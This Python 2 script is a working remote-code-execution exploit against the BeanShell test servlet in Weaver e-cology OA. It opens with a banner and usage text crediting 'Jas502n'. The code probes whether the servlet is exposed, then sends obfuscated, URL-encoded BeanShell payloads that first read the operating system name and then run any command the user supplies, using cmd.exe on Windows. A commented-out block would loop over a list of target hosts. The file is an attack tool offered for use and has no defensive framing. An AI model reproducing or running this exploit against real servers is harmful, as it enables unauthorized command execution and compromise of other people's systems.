# coding=utf-8

import requests
import sys
import re

banner = '''
  ____                    _____ _          _ _    _____   _____ ______ 
 |  _ \                  / ____| |        | | |  |  __ \ / ____|  ____|
 | |_) | ___  __ _ _ __ | (___ | |__   ___| | |  | |__) | |    | |__   
 |  _ < / _ \/ _` | '_ \ \___ \| '_ \ / _ \ | |  |  _  /| |    |  __|  
 | |_) |  __/ (_| | | | |____) | | | |  __/ | |  | | \ \| |____| |____ 
 |____/ \___|\__,_|_| |_|_____/|_| |_|\___|_|_|  |_|  \_\\_____|______|
                                                                                                                                             
                 泛微e-cology OA Beanshell组件远程代码执行

                     Python By Jas502n

             Usage: python bsh.py http://x.x.x.x/ command

'''
print banner

def vuln_url(url,cmd):
    if url[-1] == '/':
        vuln_url = url + "weaver/bsh.servlet.BshServlet"
    else:
        vuln_url = url + "/weaver/bsh.servlet.BshServlet"
    r = requests.get(vuln_url)
    if r.status_code ==200 and 'BeanShell Test Servlet' in r.text:
        print vuln_url + "  >>>Exit!"
        print
        get_os(vuln_url)
        # exec_command(vuln_url,cmd)
    else:
        print "No Exit!"

def get_os(vuln_url):
    vuln_url=vuln_url
    headers = {
    'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:55.0) Gecko/20100101 Firefox/55.0",
    'Content-Type': "application/x-www-form-urlencoded",
    'Content-Length': "43",
    'Referer': "%s"%vuln_url,
    'Connection': "close"
    }
    payload = r'''bsh.script=print(Interpreter.VERSION);%53%74%72%69%6e%67%20%4f%53%20%3d%20%53%79%73%74%65%6d%2e%67%65%74%50%72%6f%70%65%72%74%69%65%73%28%29%2e%67%65%74%50%72%6f%70%65%72%74%79%28%22%6f%73%2e%6e%61%6d%65%22%29%3b%0d%0a%70%72%69%6e%74%28%4f%53%29%3bpwd()'''
    r =requests.post(url=vuln_url,data=payload,headers=headers)
    if r.status_code==200 and r'getProperty' in r.content:
        # print "Exec Command Successful!\n"
        m = re.compile(r'<td bgcolor="#eeeeee">\n<pre>(.*)</pre>\n</td></tr></table>',re.DOTALL)
        result = m.findall(r.content)[0]
        print ">>>>>>>>>>>>>>OS NAME>>>>>>>>>>>>>>>>\n" + result + ">>>>>>>>>>>>>>OS NAME>>>>>>>>>>>>>>>>\n"

        if "Windows" in result:
        	payload = r'''bsh.script=%5Cu0065%5Cu0078%5Cu0065%5Cu0063%28%22''' + 'cmd.exe /c'+ cmd + r"%22%29%3B"
        else:
            payload = r'''bsh.script=%5Cu0065%5Cu0078%5Cu0065%5Cu0063%28%22''' + cmd + r"%22%29%3B"
        r2 = r =requests.post(url=vuln_url,data=payload,headers=headers)
        if r.status_code==200 and cmd in r.content:
        	print "Exec Command Successful!\n"
        	m = re.compile(r'<td bgcolor="#eeeeee">\n<pre>(.*)</pre>\n</td></tr></table>',re.DOTALL)
        	result = m.findall(r.content)[0]
        	print result
        else:
        	print "Exec Command Fail!"
        	print r.content
    else:
        print "Exec Command Fail!"
        print r.content

if __name__ == '__main__':
    1
    if len(sys.argv) != 3:
        sys.exit("Usage: python %s http://127.0.0.1:8080/ CMD\n\n\n" % sys.argv[0])
    else:
        url = sys.argv[1]
        cmd = sys.argv[2]
        vuln_url(url,cmd)
        # filename = sys.argv[1]
        # file = open("%s"% filename).readlines()
        # for i in file:
        #     ip = i.split('\n')[0]
        #     vuln_url(url,cmd)    

